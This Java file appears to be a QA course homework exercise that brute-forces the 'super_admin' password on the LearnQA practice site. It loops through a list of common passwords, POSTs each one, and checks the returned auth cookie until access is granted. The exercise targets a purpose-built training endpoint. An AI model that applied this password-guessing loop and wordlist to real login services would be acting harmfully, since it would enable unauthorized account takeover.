import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class PasswordTest {

    private final static String LOGIN = "super_admin";
    private final static String PASSWORDS_URL = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
    private final static String CHECK_AUTH_URL = "https://playground.learnqa.ru/ajax/api/check_auth_cookie";

    public static void main(String[] args) throws Exception {
        String[] passwords = {
                "password",
                "123456",
                "qwerty",
                "abc123",
                "letmein",
                "monkey",
                "football",
                "iloveyou",
                "admin",
                "welcome",
                "ninja",
                "mustang",
                "access",
                "shadow",
                "master",
                "michael",
                "superman",
                "starwars",
                "batman",
                "trustno1",
                "jordan",
                "harley",
                "passw0rd",
                "ranger",
                "sunshine"
        };

        for (String password : passwords) {
            Map<String, Object> responseCookies = sendPostRequest(PASSWORDS_URL, LOGIN, password);
            if (!responseCookies.isEmpty()) {
                String authCookieValue = (String) responseCookies.get("auth_cookie");
                boolean isAuthorized = checkAuthCookie(authCookieValue);

                if (isAuthorized) {
                    System.out.println("Правильный пароль: " + password);
                    break;
                }
            }
        }
    }

// Создаем функцию для отправки запроса и получения куки
    private static Map<String, Object> sendPostRequest(String urlStr, String login, String password) throws IOException {
        URL url = new URL(urlStr);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setDoOutput(true);
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

        try (BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(connection.getOutputStream(), StandardCharsets.UTF_8))) {
            String postData = "login=" + login + "&password=" + password;
            writer.write(postData);
        }

        Map<String, Object> result = new HashMap<>();
        int responseCode = connection.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK) {
            for (Map.Entry<String, List<String>> entry : connection.getHeaderFields().entrySet()) {
                if ("Set-Cookie".equals(entry.getKey())) {
                    for (String value : entry.getValue()) {
                        if (value.contains("auth_cookie")) {
                            String[] parts = value.split(";");
                            for (String part : parts) {
                                if (part.trim().startsWith("auth_cookie=")) {
                                    result.put("auth_cookie", part.substring(part.indexOf('=') + 1));
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        }
        return result;
    }

// Содаем функцию для проверки куки
    private static boolean checkAuthCookie(String authCookieValue) throws IOException {
        URL url = new URL(CHECK_AUTH_URL);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        connection.setRequestProperty("Cookie", "auth_cookie=" + authCookieValue);

        try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
            String responseBody = reader.readLine();
            return "You are authorized".equals(responseBody);
        }
    }
}

